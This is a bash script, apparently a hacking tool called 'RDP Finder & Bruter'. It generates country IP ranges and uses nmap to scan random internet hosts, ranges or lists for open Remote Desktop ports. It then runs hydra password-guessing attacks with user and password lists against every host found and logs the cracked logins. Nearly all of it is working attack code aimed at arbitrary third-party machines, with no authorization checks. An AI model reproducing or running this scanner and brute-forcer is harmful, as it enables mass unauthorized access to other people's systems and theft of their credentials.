#!/bin/bash
# RDP Finder & Bruter Script
#
# Requires NMAP & HYDRA (w/RDP Support)

#Start the magic....
JUNK=/tmp
SCANCOUNT="$2"
STORAGE1=$(mktemp -p "$JUNK" -t fooooobar1.tmp.XXX)
STORAGE2=$(mktemp -p "$JUNK" -t fooooobar2.tmp.XXX)

#First a simple Bashtrap function to handle interupt (CTRL+C)
trap bashtrap INT

function bashtrap(){
	echo
	echo
	echo 'CTRL+C has been detected!.....shutting down now' | grep --color '.....shutting down now'
	#exit entire script if called
	rm -f "$STORAGE1" 2> /dev/null
	rm -f "$STORAGE2" 2> /dev/null
	exit;
}
#End bashtrap()


function usage(){
	echo
	echo "HR's RDP Finder" | grep --color -E 'HR||s RDP Finder'
	echo
	echo "USAGE: $0 <ARG> <OPTION>" | grep --color 'USAGE'
	echo "-G"
	echo "	[*] Genrate IP Range lists based on Country"
	echo "-F <#>"
	echo "	[*] NMAP Scan of <#> random hosts checking for Enabled RDP Port"
	echo "-R <IP-RANGE>"
	echo "	[*] NMAP Scan of <IP-RANGE> checking for Enabled RDP Port"
	echo "-L </path/to/ip.lst>"
	echo "	[*] NMAP Scan using provided IP list (one per line) to check for Enabled RDP Port"
	echo "-C"
	echo "	[*] Cracker Script with easy to follow prompts"
	echo "-c"
	echo "	[*] Cracker Script with Username, IP and Password lists provided"
	echo "	[*] Requires -I/i, -U/u, and -P/p flags (ORDER SPECIFIC => I=>U=>P):"
	echo "		-U <USERNAME>"
	echo "		-u </path/to/users.lst>"
	echo "		-P </path/to/password.lst>"
	echo "		-p <password>"
	echo "		-I </path/to/ip.lst>"
	echo "		-i <IP>"
	echo
	echo "EX: $0 -G" | grep --color 'EX'	
	echo "EX: $0 -C" | grep --color 'EX'
	echo "EX: $0 -F 1000" | grep --color 'EX'
	echo "EX: $0 -R 192.168.0.0-192.168.3.255" | grep --color 'EX'
	echo "EX: $0 -L /home/hood3drob1n/Desktop/ip.lst" | grep --color 'EX'
	echo "EX: $0 -c -I /path/to/ip.lst -U Administrator -P /path/to/password.lst" | grep --color 'EX'
	echo "EX: $0 -c -I /path/to/ip.lst -u /path/to/users.lst -P /path/to/password.lst" | grep --color 'EX'
	echo "EX: $0 -c -I /path/to/ip.lst -u /path/to/users.lst -p \"P@ssw0rd1\"" | grep --color 'EX'
	echo "EX: $0 -c -i 192.168.2.51 -U Administrator -P /path/to/password.lst" | grep --color 'EX'
	echo "EX: $0 -c -i 192.168.2.51 -u /path/to/users.lst -P /path/to/password.lst" | grep --color 'EX'
	echo
	exit;
}
#End usage()


function generate_ip_range(){
	if [ ! -d range_lists ]; then
		mkdir range_lists
	fi
	echo "Please select which country to grab IP ranges for from the list below: " | grep --color 'Please select which country to grab IP ranges for from the list below'
	# Grab actual list of Countries and use to present options menu to user:
	curl http://services.ce3c.be/ciprg/ -s | grep "href='?countrys=" | sed -e "s/<td><font size='2'><a href='?countrys=/'/g" -e 's/<\/tr><tr>//g' -e 's/<table><tr>//g' | while read line; do awk -F"'" '{ print $2 }' | sed '/^$/d' >> "$STORAGE1"; done;

	select COUNTRY in $(cat "$STORAGE1")
	do 
		echo "OK, grabbing IP range for $COUNTRY...." | grep --color -E 'OK||grabbing IP range for';
		break 
	done

	curl http://services.ce3c.be/ciprg/?countrys=$COUNTRY -s > "$STORAGE2"; 
	echo
	echo "IP Ranges for: $COUNTRY" | grep --color 'IP Ranges for'
	echo
	cat "$STORAGE2" | sort | uniq | awk -F":" '{ print $2 }' | while read line
	do
			firstOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $1 }')
			firstOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $5 }')
			secondOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $2 }')
			secondOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $6 }')
			thirdOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $3 }')
			thirdOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $7 }')
			fourthOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $4 }')
			fourthOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $8 }')
			if [ "$firstOctStart" == "$firstOctEnd" ]; then
				IP1="$firstOctStart"
			else
				IP1="$firstOctStart-$firstOctEnd"
			fi
			if [ "$secondOctStart" == "$secondOctEnd" ]; then
				IP2="$secondOctStart"
			else
				IP2="$secondOctStart-$secondOctEnd"
			fi
			if [ "$thirdOctStart" == "$thirdOctEnd" ]; then
				IP3="$thirdOctStart"
			else
				IP3="$thirdOctStart-$thirdOctEnd"
			fi
			if [ "$fourthOctStart" == "$fourthOctEnd" ]; then
				IP4="$fourthOctStart"
			else
				IP4="$fourthOctStart-$fourthOctEnd"
			fi
			echo "$IP1.$IP2.$IP3.$IP4" >> range_lists/`echo $COUNTRY`_IP_ranges.lst
	done
	cat range_lists/`echo $COUNTRY`_IP_ranges.lst
	echo
	echo "Do you want to continue generating Country IP Lists? (y/n)" | grep --color -E 'Do you want to continue generating Country IP Lists||y||n'
	read continueAnswer
	echo
	if [ "$continueAnswer" == 'y' ] || [ "$continueAnswer" == 'Y' ]; then
		echo '' > "$STORAGE1"
		echo '' > "$STORAGE2"
		IP1=""
		IP2=""
		IP3=""
		IP4=""
		clear
		generate_ip_range
	else
		clear
		usage
	fi
}


function rdp_find(){
	if [ ! -d rdp_enabled ]; then
		mkdir rdp_enabled
	fi
	TRACKER=0
	if [ -e rdp_enabled/rdp-ip.lst ]; then
		EXISTING=$(wc -l rdp_enabled/rdp-ip.lst | cut -d' ' -f1)
		cat rdp_enabled/rdp-ip.lst > "$STORAGE1" 2> /dev/null
		TRACKER=1
	fi
	echo "Please hang tight, this might take a few...." | grep --color -E 'Please hang tight||this might take a few'
	echo '...'
	if [ "$METH" == 3 ]; then
		nmap -iL "$SCANCOUNT" -T5 -PN -p 3389 -oG "$STORAGE2" > /dev/null && grep '/open/' "$STORAGE2" |cut -d' ' -f2,4 | sed -e 's/\/open\/tcp\/\/ms-term-serv\/\/\///g' | awk '{ print $1 }' >> "$STORAGE1"
	elif [ "$METH" == 2 ]; then
		nmap "$SCANCOUNT" -T5 -PN -p 3389 -oG "$STORAGE2" > /dev/null && grep '/open/' "$STORAGE2" |cut -d' ' -f2,4 | sed -e 's/\/open\/tcp\/\/ms-term-serv\/\/\///g' | awk '{ print $1 }' >> "$STORAGE1"
	else
		nmap -iR "$SCANCOUNT" -T5 -PN -p 3389 -oG "$STORAGE2" > /dev/null && grep '/open/' "$STORAGE2" |cut -d' ' -f2,4 | sed -e 's/\/open\/tcp\/\/ms-term-serv\/\/\///g' | awk '{ print $1 }' >> "$STORAGE1"
	fi
	cat "$STORAGE1" | sort | uniq > rdp_enabled/rdp-ip.lst 2> /dev/null
	if [ "$TRACKER" == 1 ]; then
		UPDATED=$(wc -l "$STORAGE1" | cut -d' ' -f1)
		FOUNDED=$(($UPDATED-$EXISTING))
		echo
		echo "Total in List: $UPDATED" | grep --color 'Total in List'
		echo "Just Found: $FOUNDED" | grep --color 'Just Found'
		echo
		cat rdp_enabled/rdp-ip.lst		
	else
		FOUNDED=$(wc -l rdp_enabled/rdp-ip.lst | cut -d' ' -f1)
		echo
		echo "Just Found: $FOUNDED" | grep --color 'Just Found'
		echo
		cat rdp_enabled/rdp-ip.lst
	fi
	echo
	echo "What now?" | grep --color 'What now'
	select continue_options in "Awaken the Crackin" "Scan Random Hosts" "Exit"
	do
		case $continue_options in
			"Awaken the Crackin")
				clear
				METH=n00ber
				rdp_cracker
			;;
			"Scan Random Hosts")
				echo
				echo "How many random hosts to scan now?" | grep --color 'How many random hosts to scan now'
				read SCANCOUNT
				echo
				METH=1
				clear
				rdp_find
			;;
			Exit)
				echo
				echo "All done here, hope you found enough open ports....." | grep --color -E 'All done here||hope you found enough open ports'
				echo
				exit
			;;
			*)
				echo
			;;
		esac	
	done
}
#End rdp_find()


function rdp_cracker(){
	if [ ! -d rdp_results ]; then
		mkdir rdp_results
	fi
	if [ "$METH" == n00ber ]; then
		echo
		echo "Before we awaken the crackin we must get some info..." | grep --color 'Before we awaken the crackin we must get some info'
		echo "Checking for default rdp_enabled/rdp-ip.lst file...." | grep --color -E 'Checking for default rdp||enabled||rdp||ip||lst file'
		if [ ! -e rdp_enabled/rdp-ip.lst ]; then
			echo '...'
			echo "Can't find rdp-ip.lst file! Please provide path to ip list to use: " | grep --color -E 'Can||t find rdp||ip||lst file||Please provide path to ip list to use'
			read IPLIST
			ghi="-M $IPLIST"
			echo
		else
			echo '...'
			echo '......found!' | grep 'found'
			IPLIST=rdp_enabled/rdp-ip.lst
			ghi="-M $IPLIST"
			echo
		fi
		echo "Please provide username to attack: " | grep --color 'Please provide username to attack'
		read RDPNAME
		abc="-l $RDPNAME"
		echo
		echo "Please provide path to password list to use for cracking: " | grep --color 'Please provide path to password list to use for cracking'
		read PASSLIST
		if [ ! -r "$PASSLIST" ]; then
			echo
			echo "Can't read provided password list! Please check path or permissions and try again...." | grep --color -E 'Can||t read provided password list||Please check path or permissions and try again'
			echo
			cracker
		fi
		def="-P $PASSLIST"
		if [ -e rdp_results/rdp.results ]; then
			mv rdp_results/rdp.results "rdp_results/rdp.results_`date +%Y%m%d%H`.bk"
		fi
	fi
	echo
	echo "OK, now let us awaken the crackin....." | grep --color -E 'OK||now let us awaken the crackin'
	echo "Hang tight, this will take a few...." | grep --color -E 'Hang tight||this will take a few'

	hydra -v $abc $def $ghi rdp -e ns -t 10 -W 3 -f -o "$STORAGE1" 2> /dev/null

	echo
	echo "Results:" | grep --color 'Results'
	cat "$STORAGE1" | while read line
	do
		echo $line | awk -F"3389" '{ print $2 }' | sed -e 's/\]\[rdp\] //g' | grep --color -E 'host||login||password'
		echo $line | awk -F"3389" '{ print $2 }' | sed -e 's/\]\[rdp\] //g' >> rdp_results/rdp.results
	done
	echo
	echo "The crackin has gone to rest, check the rdp.results file for the full details...." | grep --color -E 'The crackin has gone to rest||check the rdp||results file for the full details'
}

#MAIN-----------------------------------------------------
clear
#Check to ensure arguments passed or provide usage info for dummies
if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ]; then
	usage
fi
if [ -e hydra.restore ]; then
	rm -f hydra.restore 2> /dev/null
fi
while getopts ":F:R:L:c:G,C" usage_options; 
do
	case $usage_options in
		F)
			METH=1
			rdp_find
		;;
		R) 
			METH=2
			rdp_find
		;;
		L)
			if [ ! -r "$SCANCOUNT" ]; then
				echo
				echo "Can't read provided IP list file! Check path or permissions and re-try....." | grep --color -E 'Can||t read provided IP list file||Check path or permissions and re||try'
				echo
				exit;
			else
				METH=3
				rdp_find
			fi
		;;
		C) 
			METH=n00ber
			rdp_cracker
		;;
		c)
			METH=advanced
			if [ $# -lt 7 ]; then
				echo
				echo "This option requires -U/u, -P/p and -I/i options to work, please review usage and re-run script...." | grep --color -E 'This option requires||U||u||P||p and||I||i options to work||please review usage and re||run script'
				echo
				usage
			fi
			if [ "$2" == "-I" ]; then
				IPLIST="$3"
				if [ ! -r "$IPLIST" ]; then
					echo
					echo "Can't read provided IP list! Please check path or permissions and try again...." | grep --color -E 'Can||t read provided IP list||Please check path or permissions and try again'
					echo
					usage
				fi
				ghi="-M $IPLIST"
			elif [ "$2" == "-i" ]; then
				IPLIST="$3"
				ghi="$IPLIST"
			fi
			if [ "$4" == "-U" ]; then
				RDPNAME="$5"
				abc="-l $RDPNAME"
			elif [ "$4" == "-u" ]; then
				RDPNAME="$5"
				abc="-L $RDPNAME"
			fi
			if [ "$6" == "-P" ]; then
				PASSLIST="$7"
				if [ ! -r "$PASSLIST" ]; then
					echo
					echo "Can't read provided password list! Please check path or permissions and try again...." | grep --color -E 'Can||t read provided password list||Please check path or permissions and try again'
					echo
				fi
				def="-P $PASSLIST"
			elif [ "$6" == "-p" ]; then
				PASSLIST="$7"
				def="-p $PASSLIST"
			fi
			if [ -e rdp_results/rdp.results ]; then
				mv rdp_results/rdp.results "rdp_results/rdp.results_`date +%Y%m%d%H`.bk"
			fi
			rdp_cracker
		;;
		G)
			echo
			generate_ip_range
		;;
		*)
			usage
		;;
	esac
done
echo
echo
echo "All done here, hope you found what you were looking for....." | grep --color -E 'All done here||hope you found what you were looking for'
echo
echo "Until next time, Enjoy!" | grep --color -E 'Until next time||Enjoy'
echo
rm -f "$STORAGE1" 2> /dev/null
rm -f "$STORAGE2" 2> /dev/null
#EOF
